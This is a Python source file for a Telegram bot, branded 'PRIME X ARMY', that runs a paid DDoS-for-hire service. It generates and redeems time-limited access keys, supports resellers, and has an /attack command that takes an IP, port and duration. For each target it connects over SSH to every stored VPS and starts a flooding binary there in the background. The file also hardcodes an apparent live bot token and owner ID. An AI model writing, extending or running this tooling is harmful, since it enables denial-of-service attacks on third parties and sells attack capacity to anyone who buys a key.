import os, time, json, paramiko, random, string, threading
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime

# ==================== CONFIG (BHARIEN) ====================
TELEGRAM_TOKEN = "8245251931:AAHRTmcXs90zC_3kd2_yIIjnA1ilUAtif5U" 
OWNER_ID = 6293907676 # Apni Numeric ID Daalein
# ==========================================================

# Database Files
FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
for f in FILES: 
    if not os.path.exists(f): 
        with open(f, 'w') as out: json.dump({} if "vps" not in f else [], out)

vps_servers, approved_users, generated_keys, resellers = [], {}, {}, []

BANNER = """
          ⚔️ 𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 ⚔️
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     👑 OWNER : @PRIME_X_ARMY
     📡 TYPE  : MASTER-V6-RAILWAY
     🚀 POWER : MULTI-VPS LINKED
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def load_data():
    global vps_servers, approved_users, generated_keys, resellers
    vps_servers = json.load(open("vps.json"))
    approved_users = json.load(open("users.json"))
    generated_keys = json.load(open("keys.json"))
    resellers = json.load(open("resellers.json"))

def save_data():
    json.dump(vps_servers, open("vps.json", 'w'), indent=2)
    json.dump(approved_users, open("users.json", 'w'), indent=2)
    json.dump(generated_keys, open("keys.json", 'w'), indent=2)
    json.dump(resellers, open("resellers.json", 'w'), indent=2)

load_data()

# --- AUTH LOGIC ---
def is_auth(uid):
    uid = str(uid)
    return uid == str(OWNER_ID) or uid in resellers or (uid in approved_users and approved_users[uid]['expiry'] > time.time())

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_auth(uid):
        await update.message.reply_text(f"{BANNER}\n❌ ACCESS DENIED!\nContact @PRIME_X_ARMY for Keys.")
        return
    await update.message.reply_text(f"{BANNER}\n✅ SYSTEM ONLINE\n\n🚀 /attack <ip> <port> <time>\n🔑 /redeem <key>\n📊 /status")

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if str(uid) != str(OWNER_ID) and str(uid) not in resellers: return
    days = int(context.args[0]) if context.args else 30
    key = f"PRIME-{''.join(random.choices(string.ascii_uppercase + string.digits, k=10))}"
    generated_keys[key] = {"dur": days * 86400, "status": "unused"}
    save_data()
    await update.message.reply_text(f"✅ KEY: `{key}`\nValid: {days} Days", parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if not context.args: return
    key = context.args[0].upper()
    if key in generated_keys and generated_keys[key]["status"] == "unused":
        expiry = time.time() + generated_keys[key]["dur"]
        approved_users[uid] = {"expiry": expiry}
        generated_keys[key]["status"] = "used"
        save_data()
        await update.message.reply_text(f"🔥 ACTIVATED!\nExpires: {datetime.fromtimestamp(expiry)}")
    else:
        await update.message.reply_text("❌ INVALID KEY!")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id): return
    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    
    ip, port, dur = context.args
    await update.message.reply_text(f"🚀 **ATTACK STARTED**\n🎯 Target: `{ip}:{port}`\n⏲️ Time: `{dur}s`", parse_mode="Markdown")
    
    for vps in vps_servers:
        threading.Thread(target=ssh_exec, args=(vps, ip, port, dur)).start()

def ssh_exec(vps, ip, port, dur):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
        # Execute binary on VPS
        ssh.exec_command(f"chmod +x PRIME && nohup ./PRIME {ip} {port} {dur} 200 > /dev/null 2>&1 &")
        ssh.close()
    except: pass

if __name__ == "__main__":
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    print("PRIME-MASTER LIVE")
    app.run_polling()